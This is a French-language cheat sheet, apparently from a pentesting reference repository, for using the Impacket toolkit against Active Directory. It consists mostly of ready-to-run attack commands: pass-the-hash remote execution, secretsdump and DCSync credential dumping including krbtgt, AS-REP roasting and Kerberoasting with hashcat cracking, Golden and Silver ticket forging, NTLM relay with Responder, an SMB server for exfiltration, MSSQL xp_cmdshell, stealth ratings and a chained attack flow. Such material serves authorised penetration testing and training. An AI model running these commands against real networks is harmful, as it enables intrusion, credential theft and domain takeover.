# 🐍 Impacket — boîte à outils Python pour les attaques AD

<!-- language-home-navigation -->
[🏠 Accueil en français](../../README.fr.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
  ██╗███╗   ███╗██████╗  █████╗  ██████╗██╗  ██╗███████╗████████╗
  ██║████╗ ████║██╔══██╗██╔══██╗██╔════╝██║ ██╔╝██╔════╝╚══██╔══╝
  ██║██╔████╔██║██████╔╝███████║██║     █████╔╝ █████╗     ██║   
  ██║██║╚██╔╝██║██╔═══╝ ██╔══██║██║     ██╔═██╗ ██╔══╝     ██║   
  ██║██║ ╚═╝ ██║██║     ██║  ██║╚██████╗██║  ██╗███████╗   ██║   
  ╚═╝╚═╝     ╚═╝╚═╝     ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝   ╚═╝   
              Boîte à outils Python de protocoles réseau
```

<p align="center">
  <img src="https://img.shields.io/badge/Impacket-Active_Directory-red?style=for-the-badge" alt="Impacket">
  <img src="https://img.shields.io/badge/Python-blue?style=for-the-badge" alt="Python">
  <img src="https://img.shields.io/badge/Kerberos-green?style=for-the-badge" alt="Kerberos">
</p>

---

## 📋 Table des matières

- [Qu’est-ce qu’Impacket ?](#-quest-ce-quimpacket-)
- [Installation](#-installation)
- [Exécution à distance](#-exécution-à-distance)
- [Extraction d’identifiants](#-extraction-didentifiants)
- [Attaques Kerberos](#-attaques-kerberos)
- [Attaques SMB](#-attaques-smb)
- [Attaques MSSQL](#-attaques-mssql)
- [Requêtes LDAP/AD](#-requêtes-ldapad)
- [Référence rapide](#-référence-rapide)
- [Ressources](#-ressources)

---

## 🎯 Qu’est-ce qu’Impacket ?

**Impacket** est un ensemble de classes Python permettant de travailler avec des protocoles réseau. Il est essentiel pour les attaques sur Active Directory (AD) :

- 🎫 **Kerberos** — AS-REP roasting, Kerberoasting et attaques sur les tickets
- 💻 **Exécution à distance** — psexec, wmiexec, smbexec, atexec
- 🔓 **Extraction d’identifiants (credential dumping)** — secretsdump, DCSync
- 📁 **SMB** — Opérations sur les fichiers et relais d’authentification
- 🗄️ **MSSQL** — Attaques sur les bases de données

### Outils principaux

| Outil | Description |
|------|-------------|
| **psexec.py** | Exécution à distance via SMB |
| **wmiexec.py** | Exécution à distance via WMI |
| **secretsdump.py** | Extraire des identifiants et empreintes (hashes) |
| **GetNPUsers.py** | AS-REP roasting |
| **GetUserSPNs.py** | Kerberoasting |
| **ntlmrelayx.py** | Attaques par relais NTLM |
| **smbclient.py** | Client SMB |
| **mssqlclient.py** | Client MSSQL |

---

## 🚀 Installation

### Kali Linux

> **Version des exemples :** les lanceurs `impacket-*` sont fournis notamment par le paquet Kali ; d’autres installations exposent les scripts `.py`. Disponibilité, dépendances et environnement Python dépendent du paquet. La documentation actuelle recommande une installation isolée ; les commandes historiques restent inchangées ([Kali](https://www.kali.org/tools/impacket-scripts/), [projet officiel](https://github.com/fortra/impacket)).

```bash
# Préinstallé dans Kali
impacket-psexec --help

# Ou installer / mettre à jour
pip3 install impacket
pip3 install impacket --upgrade
```

### Depuis GitHub

```bash
git clone https://github.com/fortra/impacket.git
cd impacket
pip3 install .

# Ou installer en mode développement
pip3 install -e .
```

### Vérifier l’installation

> **Précision :** `impacket.__version__` n’est pas défini dans le module principal actuel ; la commande de l’original peut donc échouer sans que l’installation soit absente ([source officielle](https://raw.githubusercontent.com/fortra/impacket/master/impacket/__init__.py)).

```bash
# Vérifier l’installation
impacket-psexec --help
python3 -c "import impacket; print(impacket.__version__)"
```

---

## 💻 Exécution à distance

### psexec.py

> **Précision :** ces méthodes exigent les droits et services distants adaptés ; de simples identifiants ou un partage modifiable ne garantissent pas l’exécution. Dans le dernier exemple, `-target-ip` choisit une adresse IP, pas un partage. Le nom de la cible et l’adresse de connexion peuvent être distincts ([source psexec](https://github.com/fortra/impacket/blob/master/examples/psexec.py)).

```bash
# Avec un mot de passe
impacket-psexec domain.local/user:password@10.10.10.10

# Avec une empreinte NTLM (Pass-the-Hash)
impacket-psexec domain.local/user@10.10.10.10 -hashes :NTLMHASH

# Administrateur local
impacket-psexec administrator:password@10.10.10.10

# Exécuter une commande
impacket-psexec domain.local/user:password@10.10.10.10 "whoami"

# Cibler un partage précis
impacket-psexec domain.local/user:password@10.10.10.10 -target-ip 10.10.10.10
```

### wmiexec.py

```bash
# Plus discret que psexec
impacket-wmiexec domain.local/user:password@10.10.10.10

# Avec une empreinte
impacket-wmiexec domain.local/user@10.10.10.10 -hashes :NTLMHASH

# Exécuter une commande
impacket-wmiexec domain.local/user:password@10.10.10.10 "whoami"

# Sans sortie (silencieux)
impacket-wmiexec domain.local/user:password@10.10.10.10 -nooutput "cmd /c calc.exe"
```

### smbexec.py

```bash
# Utilise SMB pour l’exécution
impacket-smbexec domain.local/user:password@10.10.10.10

# Avec une empreinte
impacket-smbexec domain.local/user@10.10.10.10 -hashes :NTLMHASH

# Préciser le partage
impacket-smbexec domain.local/user:password@10.10.10.10 -share ADMIN$
```

### atexec.py

```bash
# Utilise le Planificateur de tâches
impacket-atexec domain.local/user:password@10.10.10.10 "whoami"

# Avec une empreinte
impacket-atexec domain.local/user@10.10.10.10 -hashes :NTLMHASH "whoami"
```

### dcomexec.py

```bash
# Utilise DCOM
impacket-dcomexec domain.local/user:password@10.10.10.10

# Différents objets DCOM
impacket-dcomexec domain.local/user:password@10.10.10.10 -object MMC20
impacket-dcomexec domain.local/user:password@10.10.10.10 -object ShellWindows
impacket-dcomexec domain.local/user:password@10.10.10.10 -object ShellBrowserWindow
```

---

## 🔓 Extraction d’identifiants

### secretsdump.py

```bash
# Extraire depuis un hôte distant
impacket-secretsdump domain.local/user:password@10.10.10.10

# Extraire avec une empreinte (PtH)
impacket-secretsdump domain.local/user@10.10.10.10 -hashes :NTLMHASH

# Extraire depuis le contrôleur de domaine (DCSync)
impacket-secretsdump domain.local/admin:password@DC01.domain.local

# Limiter DCSync à un utilisateur précis
impacket-secretsdump -just-dc-user krbtgt domain.local/admin:password@DC01.domain.local

# Seulement les empreintes NTLM, sans clés Kerberos
impacket-secretsdump -just-dc-ntlm domain.local/admin:password@DC01.domain.local

# Enregistrer dans un fichier
impacket-secretsdump domain.local/admin:password@10.10.10.10 -outputfile hashes
```

### Attaque DCSync

> **Précision :** DCSync demande des droits de réplication adaptés et récupère les attributs secrets demandés ; il ne copie pas nécessairement toute la base physique AD. Les extractions SAM/LSA locales et les opérations sur un contrôleur de domaine ont des prérequis distincts ([source secretsdump](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py)).

```bash
# DCSync complet (extraction de toute la base AD selon l’original)
impacket-secretsdump -just-dc domain.local/admin:password@DC01.domain.local

# DCSync pour un utilisateur précis
impacket-secretsdump -just-dc-user Administrator domain.local/admin:password@DC01.domain.local

# DCSync pour krbtgt (pour un Golden Ticket)
impacket-secretsdump -just-dc-user krbtgt domain.local/admin:password@DC01.domain.local

# Format de sortie : user:RID:LM:NTLM:::
```

### Depuis des fichiers locaux

```bash
# Depuis NTDS.dit + SYSTEM
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL

# Depuis SAM + SYSTEM
impacket-secretsdump -sam SAM -system SYSTEM LOCAL

# Depuis SECURITY + SYSTEM (secrets LSA)
impacket-secretsdump -security SECURITY -system SYSTEM LOCAL
```

---

## 🎫 Attaques Kerberos

### AS-REP Roasting (GetNPUsers.py)

L’AS-REP roasting vise les réponses Kerberos de comptes sans préauthentification ; le Kerberoasting exploite des tickets de service pour tester des mots de passe hors ligne.

```bash
# Rechercher les utilisateurs sans préauthentification
impacket-GetNPUsers domain.local/ -usersfile users.txt -no-pass

# Avec des identifiants
impacket-GetNPUsers domain.local/user:password -request

# Adresse IP du contrôleur de domaine précisée
impacket-GetNPUsers domain.local/user:password -dc-ip 10.10.10.10 -request

# Enregistrer dans un fichier
impacket-GetNPUsers domain.local/user:password -request -outputfile asrep.txt

# Format pour hashcat
impacket-GetNPUsers domain.local/user:password -request -format hashcat

# Format pour john
impacket-GetNPUsers domain.local/user:password -request -format john
```

### Kerberoasting (GetUserSPNs.py)

```bash
# Rechercher les utilisateurs concernés par le Kerberoasting
impacket-GetUserSPNs domain.local/user:password

# Demander des tickets TGS
impacket-GetUserSPNs domain.local/user:password -request

# Enregistrer dans un fichier
impacket-GetUserSPNs domain.local/user:password -request -outputfile kerberoast.txt

# Adresse IP du contrôleur de domaine
impacket-GetUserSPNs domain.local/user:password -dc-ip 10.10.10.10 -request

# Avec une empreinte
impacket-GetUserSPNs domain.local/user -hashes :NTLMHASH -request
```

### Rechercher les mots de passe des empreintes Kerberos

> **Précision :** les modes `18200` et `13100` correspondent respectivement aux AS-REP et TGS-REP de type de chiffrement 23 (RC4), pas à tous les tickets Kerberos. Format, politique cryptographique et mot de passe candidat déterminent le résultat ([référence Hashcat](https://hashcat.net/wiki/doku.php?id=example_hashes)).

```bash
# AS-REP (mode hashcat 18200)
hashcat -m 18200 asrep.txt wordlist.txt

# TGS/Kerberoast (mode hashcat 13100)
hashcat -m 13100 kerberoast.txt wordlist.txt

# Avec john
john --wordlist=wordlist.txt asrep.txt
john --wordlist=wordlist.txt kerberoast.txt
```

### getTGT.py

```bash
# Demander un TGT avec un mot de passe
impacket-getTGT domain.local/user:password

# Demander un TGT avec une empreinte
impacket-getTGT domain.local/user -hashes :NTLMHASH

# Demander un TGT avec une clé AES
impacket-getTGT domain.local/user -aesKey <AES256KEY>

# Enregistre dans user.ccache
# Exporter pour l’utiliser :
export KRB5CCNAME=user.ccache
```

### ticketer.py (Golden Ticket / Silver Ticket)

> **Précision :** un TGT et un ticket de service n’ont pas la même portée. Le Silver Ticket visant `MSSQLSvc` n’est pas à lui seul un ticket SMB utilisable par psexec ; clés, SID, SPN, validation et politique du domaine comptent. Le bloc juxtapose des exemples, sans garantir une chaîne universelle ([ticketer officiel](https://github.com/fortra/impacket/blob/master/examples/ticketer.py)).

```bash
# Golden Ticket
impacket-ticketer -nthash <KRBTGT_NTLM_HASH> -domain-sid S-1-5-21-... -domain domain.local Administrator

# Silver Ticket
impacket-ticketer -nthash <SERVICE_NTLM_HASH> -domain-sid S-1-5-21-... -domain domain.local -spn MSSQLSvc/target.domain.local:1433 Administrator

# Utiliser le ticket
export KRB5CCNAME=Administrator.ccache
impacket-psexec domain.local/Administrator@target.domain.local -k -no-pass
```

---

## 📁 Attaques SMB

### smbclient.py

```bash
# Se connecter au partage
impacket-smbclient domain.local/user:password@10.10.10.10

# Lister les partages
# (dans smbclient)
shares

# Se connecter à un partage précis
use SHARE_NAME

# Lister les fichiers
ls

# Télécharger un fichier
get filename

# Envoyer un fichier
put localfile

# Exécuter une commande
# (si vous pouvez écrire dans un partage)
```

### smbserver.py

```bash
# Démarrer un serveur SMB (pour l’exfiltration)
impacket-smbserver share /tmp/share

# Avec authentification
impacket-smbserver share /tmp/share -username user -password pass

# Prise en charge de SMB2
impacket-smbserver share /tmp/share -smb2support
```

### ntlmrelayx.py

> **Version des exemples :** l’option `--sam` n’est pas dans le parseur actuel cité. Les effets d’un relais dépendent des droits, du protocole et des protections, notamment la signature ; la présence de `-smb2support` ne garantit pas le succès. Les options historiques et valeurs Responder restent inchangées ([source officielle](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py)).

```bash
# Relais de base
impacket-ntlmrelayx -tf targets.txt

# Relais vers SMB
impacket-ntlmrelayx -tf targets.txt -smb2support

# Relayer et exécuter une commande
impacket-ntlmrelayx -tf targets.txt -c "whoami"

# Extraire SAM lors du relais
impacket-ntlmrelayx -tf targets.txt -smb2support --sam

# Relais vers LDAP
impacket-ntlmrelayx -t ldap://DC01.domain.local

# Avec Responder :
# 1. Modifier Responder.conf, définir SMB = Off, HTTP = Off
# 2. Exécuter : responder -I eth0
# 3. Exécuter : impacket-ntlmrelayx -tf targets.txt -smb2support
```

---

<a id="-attaques-mssql"></a>
## 🗄️ Attaques MSSQL

### mssqlclient.py

```bash
# Se connecter avec l’authentification Windows
impacket-mssqlclient domain.local/user:password@10.10.10.10 -windows-auth

# Se connecter avec l’authentification SQL
impacket-mssqlclient sa:password@10.10.10.10

# Avec une empreinte
impacket-mssqlclient domain.local/user@10.10.10.10 -hashes :NTLMHASH -windows-auth

# Se connecter à une base précise
impacket-mssqlclient domain.local/user:password@10.10.10.10 -windows-auth -db master
```

### Commandes MSSQL

> **Précision :** le bloc mélange des requêtes SQL et les commandes internes du client, comme `enable_xp_cmdshell` et la forme abrégée `xp_cmdshell whoami`. Ce n’est pas un script T-SQL autonome ; activation, permissions et compte d’exécution doivent être adaptés ([console Impacket](https://github.com/fortra/impacket/blob/master/impacket/examples/mssqlshell.py), [Microsoft](https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql)).

```sql
-- Activer xp_cmdshell
enable_xp_cmdshell

-- Exécuter une commande
xp_cmdshell whoami

-- Requête SQL
SELECT * FROM master.sys.databases

-- Lire un fichier
SELECT * FROM OPENROWSET(BULK N'C:\Windows\System32\drivers\etc\hosts', SINGLE_CLOB) AS Contents
```

---

## 📂 Requêtes LDAP/AD

### GetADUsers.py

```bash
# Lister tous les utilisateurs
impacket-GetADUsers domain.local/user:password -all

# Contrôleur de domaine précis
impacket-GetADUsers domain.local/user:password -dc-ip 10.10.10.10 -all

# Avec une empreinte
impacket-GetADUsers domain.local/user -hashes :NTLMHASH -all
```

### lookupsid.py

```bash
# Énumérer les utilisateurs par essais successifs de SID
impacket-lookupsid domain.local/user:password@10.10.10.10

# Préciser la plage de SID
impacket-lookupsid domain.local/user:password@10.10.10.10 20000
```

### findDelegation.py

```bash
# Rechercher les paramètres de délégation
impacket-findDelegation domain.local/user:password -dc-ip 10.10.10.10
```

---

## 📊 Référence rapide

### Options d’authentification

> **Précision :** `-aesKey` accepte, selon l’outil, des clés AES de 128 ou 256 bits ; la ligne AES256 du tableau est simplifiée. Le Pass-the-Hash utilise une empreinte NTLM pour s’authentifier, sans retrouver le mot de passe ; un fichier ccache doit contenir des tickets compatibles avec la cible ([options officielles](https://github.com/fortra/impacket/blob/master/examples/mssqlclient.py)).

| Option | Description |
|--------|-------------|
| `user:password` | Authentification par mot de passe |
| `-hashes :NTLM` | Empreinte NTLM (Pass-the-Hash) |
| `-hashes LM:NTLM` | Empreintes LM:NTLM |
| `-aesKey KEY` | Clé AES256 |
| `-k -no-pass` | Kerberos avec un cache de tickets ccache |

### Options courantes

| Option | Description |
|--------|-------------|
| `-dc-ip IP` | Adresse IP du contrôleur de domaine |
| `-target-ip IP` | Adresse IP de la cible |
| `-debug` | Activer la sortie de débogage |

### Résumé de l’exécution à distance

> **Précision :** les niveaux de discrétion du tableau sont des appréciations du texte original, pas une garantie d’absence de traces. Le déroulement suivant est incomplet : il n’enregistre pas explicitement les fichiers `asrep.txt` et `kerberoast.txt` consommés ensuite ; les exemples ne constituent pas une procédure directement enchaînable.

| Outil | Méthode | Discrétion |
|------|--------|---------|
| psexec.py | SMB + service | Faible |
| wmiexec.py | WMI | Moyenne |
| smbexec.py | SMB | Faible |
| atexec.py | Planificateur de tâches | Élevée |
| dcomexec.py | DCOM | Moyenne |

### Déroulement d’une attaque

```bash
# 1. Énumérer les utilisateurs (AS-REP roasting)
impacket-GetNPUsers domain.local/ -usersfile users.txt -no-pass

# 2. Effectuer un Kerberoasting
impacket-GetUserSPNs domain.local/user:password -request

# 3. Rechercher les mots de passe des empreintes
hashcat -m 18200 asrep.txt rockyou.txt
hashcat -m 13100 kerberoast.txt rockyou.txt

# 4. Utiliser le Pass-the-Hash (PtH) ou le mot de passe
impacket-psexec domain.local/admin:password@10.10.10.10

# 5. Extraire les identifiants
impacket-secretsdump domain.local/admin:password@DC01

# 6. Utiliser DCSync pour toutes les empreintes
impacket-secretsdump -just-dc domain.local/admin:password@DC01
```

---

## 📚 Ressources

- [Impacket sur GitHub](https://github.com/fortra/impacket)
- [Exemples Impacket](https://github.com/fortra/impacket/tree/master/examples)
- [Wiki](https://github.com/fortra/impacket/wiki)

### Aide-mémoire associés
- [BloodHound](../../BloodHound/translations/README.fr.md)
- [Mimikatz](../../Mimikatz/translations/README.fr.md)
- [Hashcat](../../Hashcat/translations/README.fr.md)

---

<p align="center">
  <b>🐍 Maîtrisez les attaques AD avec Python !</b><br>
  <i>Impacket — la boîte à outils indispensable du pentesteur</i>
</p>
